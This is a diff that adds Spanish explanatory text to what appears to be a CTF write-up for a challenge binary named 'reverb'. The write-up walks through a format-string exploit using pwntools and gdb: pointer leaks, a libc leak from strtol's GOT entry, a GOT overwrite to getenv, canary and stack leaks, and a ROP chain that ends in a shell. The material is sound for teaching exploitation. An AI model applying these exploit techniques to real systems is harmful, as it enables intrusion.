@@ -196,7 +196,7 @@ AAAA
 <section class="post" id="exploitation">
 <br><h3 class="post-title">Explotación</h3><br>
 
-
+<p class="plain-text">Iniciamos mirando las protecciones con <code class="language-plaintext highlighter-rouge">checksec</code>, el <code class="language-plaintext highlighter-rouge">NX</code> nos impedirá ejecutar un shellcode en el stack y el <code class="language-plaintext highlighter-rouge">Canary</code> establece una stack cookie en <code class="language-plaintext highlighter-rouge">rbp - 8</code>, luego compara que no se haya modificado antes del ret evitando explotaciones del stack</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ve">❯ checksec </span><span class="p">chall
 [</span><span class="az">*</span><span class="p">] '/home/user/chall'
@@ -207,6 +207,7 @@ AAAA
     PIE:        </span><span class="ro">No PIE (0x3fe000)  </span>
 </code></pre></div></div><br>
 
+<p class="plain-text">Sabemos que el rango válido es del <code class="language-plaintext highlighter-rouge">10</code> al <code class="language-plaintext highlighter-rouge">57</code>, entonces podemos lekear los punteros a partir del <code class="language-plaintext highlighter-rouge">10</code> usando el formato <code class="language-plaintext highlighter-rouge">%p</code>, lo haremos y veremos como se comporta</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ve">❯ ./chall</span><span class="p">
 >> %10$p.%11$p.%12$p
@@ -214,6 +215,7 @@ AAAA
 >></span>
 </code></pre></div></div><br>
 
+<p class="plain-text">Probaremos enviar los punteros en las posiciones válidas una a la vez, mirando los resultados luego del 10 todos son punteros <code class="language-plaintext highlighter-rouge">null</code> y ningun leak interesante</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="c1">#!/usr/bin/python3
 </span><span class="o">from</span><span class="p"> pwn</span><span class="o"> import</span><span class="p"> process, log
@@ -233,7 +235,7 @@ shell.interactive()</span>
 <code><span class="ve">❯ python3</span><span class="p"> exploit.py
 [</span><span class="ve">+</span><span class="p">] Starting local process '/usr/bin/gdbserver': pid 1247758
 [</span><span class="az">*</span><span class="p">] running in new terminal: ['/usr/bin/gdb', '-q', './chall']  
-[</span><span class="az">*</span><span class="p">] 10: 0xa7024303125
+[</span><span class="az">*</span><span class="p">] 10: 0x7024303125
 [</span><span class="az">*</span><span class="p">] 11: (nil)
 [</span><span class="az">*</span><span class="p">] 12: (nil)
 [</span><span class="az">*</span><span class="p">] 13: (nil)
@@ -256,20 +258,20 @@ shell.interactive()</span>
 >> </span><span class="ro">$</span>
 </code></pre></div></div><br>
 
+<p class="plain-text">El único puntero que nos muestra es en payload enviado en hexadecimal, lo que nos quiere decir que desde el primer puntero refleja nuestros datos y no valores del stack</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ve">❯ unhex</span><span class="p"> 31252e7024303125 | </span><span class="ve">rev</span><span class="p">  
-%10$p.%1
-
-</span><span class="ve">❯ unhex</span><span class="p"> 243231252e702431 |</span><span class="ve"> rev</span><span class="p">  
-1$p.%12$</span>
+<code><span class="ve">❯ unhex</span><span class="p"> 7024303125 | </span><span class="ve">rev</span><span class="p">  
+%10$p</span>
 </code></pre></div></div><br>
 
+<p class="plain-text">Entonces, podemos enviar <code class="language-plaintext highlighter-rouge">%11$p</code> para hacer un leak de la posición <code class="language-plaintext highlighter-rouge">11</code> y luego rellenar con <code class="language-plaintext highlighter-rouge">.</code> a <code class="language-plaintext highlighter-rouge">8</code> bytes que es el tamaño del puntero, luego enviamos <code class="language-plaintext highlighter-rouge">AAAABBBB</code>, el resultado es que el leak muestra estos caractéres de la posición <code class="language-plaintext highlighter-rouge">11</code> como puntero</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="p">>> %11$p...AAAABBBB
 0x4242424241414141...AAAABBBB  
 >></span>
 </code></pre></div></div><br>
 
+<p class="plain-text">Podemos aprovechar esto para hacer un leak de libc, para ello solo necesitamos la entrada <code class="language-plaintext highlighter-rouge">got</code> de la función <code class="language-plaintext highlighter-rouge">strtol</code> que contiene una referencia a su posición en libc</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ro">pwndbg></span><span class="p"> got -r strtol
 Filtering by symbol name: strtol
@@ -280,11 +282,13 @@ GOT protection: </span><span class="am">Partial RELRO</span><span class="p"> | F
 </span><span class="ro">pwndbg></span>
 </code></pre></div></div><br>
 
+<p class="plain-text">También necesitamos el offset ésta la misma función pero en libc que obtenemos con <code class="language-plaintext highlighter-rouge">readelf</code>, esto para restarle esa cantidad al leak y obtener la dirección base de libc</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ve">❯ readelf</span><span class="p"> -s libc.so.6 |</span><span class="ve"> grep</span><span class="p"> strtol@
   1204: 00000000000474e0    22 FUNC    WEAK   DEFAULT   15 </span><span class="ro">strtol@</span><span class="p">@GLIBC_2.2.5</span>  
 </code></pre></div></div><br>
 
+<p class="plain-text">Entonces, ahora el exploit usa <code class="language-plaintext highlighter-rouge">%11$s</code> para mostrar como string el contenido de la posición <code class="language-plaintext highlighter-rouge">11</code>, rellenamos el qword y para esa posición le pasamos la entrada <code class="language-plaintext highlighter-rouge">got</code> de la función <code class="language-plaintext highlighter-rouge">strtol</code>, entonces ejecutará algún tipo de <code class="language-plaintext highlighter-rouge">printf(strtol@got)</code> que muestra la dirección de <code class="language-plaintext highlighter-rouge">strtol</code> en memoria y al restar el offset nos da la dirección base de libc</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="c1">#!/usr/bin/python3
 </span><span class="o">from</span><span class="p"> pwn</span><span class="o"> import</span><span class="p"> gdb, p64, u64, log
@@ -300,6 +304,7 @@ log.info(</span><span class="no">f</span><span class="s">"Libc base:</span><span
 shell.interactive()</span>
 </code></pre></div></div><br>
 
+<p class="plain-text">Ejecutamos el exploit y nos muestra la dirección lekeada, si comparamos esta dirección con la base de libc que vemos en <code class="language-plaintext highlighter-rouge">gdb</code> es exactamente la misma</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ve">❯ python3 </span><span class="p">exploit.py
 [</span><span class="ve">+</span><span class="p">] Starting local process '/usr/bin/gdbserver': pid 834697
@@ -327,11 +332,16 @@ LEGEND:</span><span class="am"> STACK</span><span class="p"> |</span><span class
 </span><span class="ro">pwndbg></span>
 </code></pre></div></div><br>
 
+<p class="plain-text">Algo a tener en cuenta es que aunque tenemos un leak de libc aun necesitamos más leaks por ejemplo del stack, para ello eliminaremos la última limitación, toma el valor de retorno de la llamada a <code class="language-plaintext highlighter-rouge">strtol</code> y compara que sea menor o igual que <code class="language-plaintext highlighter-rouge">57</code></p>
+<a href="/challenges/reverb/9.png" target="_blank"><div><p><img src="/challenges/reverb/9.png"></p></div></a>
+
+<p class="plain-text">Lo que haremos es modificar la entrada <code class="language-plaintext highlighter-rouge">got</code> de <code class="language-plaintext highlighter-rouge">strtol</code> a una función que siempre devuelva un valor de retorno bajo por ejemplo <code class="language-plaintext highlighter-rouge">getenv</code> que casi siempre devuelve <code class="language-plaintext highlighter-rouge">0</code></p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ve">❯ readelf </span><span class="p">-s libc.so.6 |</span><span class="ve"> grep</span><span class="p"> getenv
   1808: 0000000000044b70   229 FUNC    GLOBAL DEFAULT   15 </span><span class="ro">getenv</span><span class="p">@@GLIBC_2.2.5  </span>
 </code></pre></div></div><br>
 
+<p class="plain-text">Crearemos una función que escriba un <code class="language-plaintext highlighter-rouge">qword</code> en una dirección específica a través de un format string y una primitiva <code class="language-plaintext highlighter-rouge">write-what-where</code>, iniciamos creando un array con <code class="language-plaintext highlighter-rouge">8</code> tuplas que contienen la dirección donde queremos escribir el byte y el <code class="language-plaintext highlighter-rouge">byte</code> que queremos escribir, una vez lo creamos ordenaremos las tuplas usando <code class="language-plaintext highlighter-rouge">sorted</code></p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="o">def</span><span class="na"> write</span><span class="p">(</span><span class="am">what</span><span class="p">,</span><span class="am"> where</span><span class="p">):
     payload  </span><span class="o">= </span><span class="no">b</span><span class="s">""</span><span class="p">
@@ -345,6 +355,7 @@ LEGEND:</span><span class="am"> STACK</span><span class="p"> |</span><span class
     array</span><span class="o"> =</span><span class="no"> sorted</span><span class="p">(array, </span><span class="am">key</span><span class="o">=lambda</span><span class="am"> x</span><span class="p">: x[</span><span class="mi">1</span><span class="p">])</span>
 </code></pre></div></div><br>
 
+<p class="plain-text">Sabemos que el buffer es de <code class="language-plaintext highlighter-rouge">384</code> bytes y al final enviaremos <code class="language-plaintext highlighter-rouge">8</code> qwords de las direcciones, lo que nos deja un rango de <code class="language-plaintext highlighter-rouge">49</code> posiciones, iniciaremos ahí ya que si fuera la <code class="language-plaintext highlighter-rouge">50</code> usariamos los <code class="language-plaintext highlighter-rouge">384</code> que no nos dejaría espacio para el salto de linea</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ve">❯ python3 </span><span class="p">-q
 >>> (49 - 10 + 8) * 8  
@@ -354,12 +365,14 @@ LEGEND:</span><span class="am"> STACK</span><span class="p"> |</span><span class
 >>></span>
 </code></pre></div></div><br>
 
+<p class="plain-text">Entonces una vez enviamos el payload rellenamos hasta los <code class="language-plaintext highlighter-rouge">312</code> bytes para llenar las posiciones, a partir de la posición <code class="language-plaintext highlighter-rouge">49</code> enviaremos los <code class="language-plaintext highlighter-rouge">8</code> qwords de las direcciones</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="p">>>> (49 - 10) * 8  
 312
 >>></span>
 </code></pre></div></div><br>
 
+<p class="plain-text">Nuestro payload inicia escribiendo un payload de format string para escribir en la posición indicada con <code class="language-plaintext highlighter-rouge">%</code> partiendo desde la <code class="language-plaintext highlighter-rouge">49</code> un byte con <code class="language-plaintext highlighter-rouge">$hhn</code> que toma de la resta del valor menos los bytes escritos, luego de ello rellenamos hasta <code class="language-plaintext highlighter-rouge">312</code> bytes y finalizamos con los <code class="language-plaintext highlighter-rouge">8</code> qwords en las posiciones donde se deben escribir los bytes</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="p">    written </span><span class="o">= </span><span class="mi">0</span><span class="p">
     i</span><span class="o"> =</span><span class="mi"> 49</span><span class="p">
@@ -379,6 +392,7 @@ LEGEND:</span><span class="am"> STACK</span><span class="p"> |</span><span class
     shell.sendlineafter(</span><span class="no">b</span><span class="s">">> "</span><span class="p">, payload)</span>
 </code></pre></div></div><br>
 
+<p class="plain-text">Ahora nuestro exploit luce de esta forma, luego de definir la función escribimos en la entrada <code class="language-plaintext highlighter-rouge">got</code> de <code class="language-plaintext highlighter-rouge">strtol</code> la dirección hacia la función <code class="language-plaintext highlighter-rouge">getenv</code>, esto lo podemos comprobar desde <code class="language-plaintext highlighter-rouge">gdb</code>, ahora al llamar a <code class="language-plaintext highlighter-rouge">strtol</code> en realidad llamará a <code class="language-plaintext highlighter-rouge">getenv</code></p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="c1">#!/usr/bin/python3
 </span><span class="o">from</span><span class="p"> pwn</span><span class="o"> import</span><span class="p"> gdb, p64, u64
@@ -433,6 +447,7 @@ Program received signal SIGINT, Interrupt.
 </span><span class="ro">pwndbg></span>
 </code></pre></div></div><br>
 
+<p class="plain-text">Una vez la condición se cumple podemos hacer leaks mas allá de la posición <code class="language-plaintext highlighter-rouge">57</code></p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="c1">#!/usr/bin/python3
 </span><span class="o">from</span><span class="p"> pwn</span><span class="o"> import</span><span class="p"> gdb, p64, u64, log
@@ -458,6 +473,7 @@ write(libc_base</span><span class="o"> +</span><span class="mi"> 0x044b70</span>
 shell.interactive()</span>
 </code></pre></div></div><br>
 
+<p class="plain-text">El leak de la posición <code class="language-plaintext highlighter-rouge">59</code> muestra la stack cookie, lo sabemos porque termina con el byte <code class="language-plaintext highlighter-rouge">00</code>, además la posición <code class="language-plaintext highlighter-rouge">65</code> muestra una dirección perteneciente al stack</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ve">❯ python3</span><span class="p"> exploit.py
 [</span><span class="ve">+</span><span class="p">] Starting local process '/usr/bin/gdbserver': pid 1249736
@@ -496,6 +512,7 @@ LEGEND:</span><span class="am"> STACK</span><span class="p"> | </span><span clas
 </span><span class="ro">pwndbg></span>
 </code></pre></div></div><br>
 
+<p class="plain-text">Una vez hacemos el leak del stack restauramos <code class="language-plaintext highlighter-rouge">strtol</code> por su valor inicial, entonces si intentamos mostrar un valor mayor a <code class="language-plaintext highlighter-rouge">57</code> saldrá del programa lo que quiere decir que llegará al <code class="language-plaintext highlighter-rouge">ret</code> del <code class="language-plaintext highlighter-rouge">main</code> para salir, podemos usar ese <code class="language-plaintext highlighter-rouge">ret</code> para ejecutar un ropchain</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="c1">#!/usr/bin/python3
 </span><span class="o">from</span><span class="p"> pwn </span><span class="o">import</span><span class="p"> gdb, p64, u64, log
@@ -522,6 +539,7 @@ shell.sendlineafter(</span><span class="no">b</span><span class="s">">> "</span>
 shell.interactive()</span>
 </code></pre></div></div><br>
 
+<p class="plain-text">Una vez llegamos al breakpoint del <code class="language-plaintext highlighter-rouge">ret</code> en <code class="language-plaintext highlighter-rouge">main+300</code> podemos ver el valor del registro <code class="language-plaintext highlighter-rouge">rsp</code>, si restamos el valor del leak a el nos da un offset de <code class="language-plaintext highlighter-rouge">0x110</code> bytes, si escribimos en la dirección de <code class="language-plaintext highlighter-rouge">rsp</code> al llegar al <code class="language-plaintext highlighter-rouge">ret</code> ejecutará lo que escribamos ahí</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ve">❯ python3</span><span class="p"> exploit.py
 [</span><span class="ve">+</span><span class="p">] Starting local process '/usr/bin/gdbserver': pid 1272760
@@ -540,6 +558,7 @@ shell.interactive()</span>
 </span><span class="ro">pwndbg></span>
 </code></pre></div></div><br>
 
+<p class="plain-text">Nuestro exploit calcula la posición del <code class="language-plaintext highlighter-rouge">rsp</code> cuando llegamos al <code class="language-plaintext highlighter-rouge">ret</code> luego escribe ahí con la primitiva <code class="language-plaintext highlighter-rouge">write-what-where</code> el ropchain una dirección a la vez hasta completarlo</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="c1">#!/usr/bin/python3
 </span><span class="o">from</span><span class="p"> pwn</span><span class="o"> import</span><span class="p"> process, p64, u64
@@ -594,6 +613,7 @@ shell.sendlineafter(</span><span class="no">b</span><span class="s">">> "</span>
 shell.interactive()</span>
 </code></pre></div></div><br>
 
+<p class="plain-text">Luego de escribir el ropchain y obligar ejecutar el <code class="language-plaintext highlighter-rouge">ret</code> intentando acceder a una posición invalida como <code class="language-plaintext highlighter-rouge">58</code>, se ejecuta lo que escribimos y obtenemos una shell</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ve">❯ python3</span><span class="p"> exploit.py
 [</span><span class="ve">+</span><span class="p">] Starting local process './chall': pid 1283781  
